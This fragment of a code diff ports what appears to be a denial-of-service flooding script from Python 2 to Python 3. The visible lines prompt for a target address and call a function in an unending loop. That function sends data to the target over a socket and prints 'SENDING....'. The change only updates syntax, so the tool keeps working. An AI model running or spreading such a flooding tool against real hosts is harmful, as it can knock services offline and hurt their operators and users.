@@ -17,10 +17,10 @@ def sdsrv(url):
             xp = str(xp).encode("utf-8")
             s.setblocking(0)
             s.send(xp)
-            print "SENDING....",xp ,"      ",a
+            print("SENDING....",xp ,"      ",a)
 
 
-ad = str(raw_input("[ENTRER ADDRESS TARGET :]"))
+ad = str(input("[ENTRER ADDRESS TARGET :]"))
 z = 123
 while z != 98765 :
     sdsrv(ad)
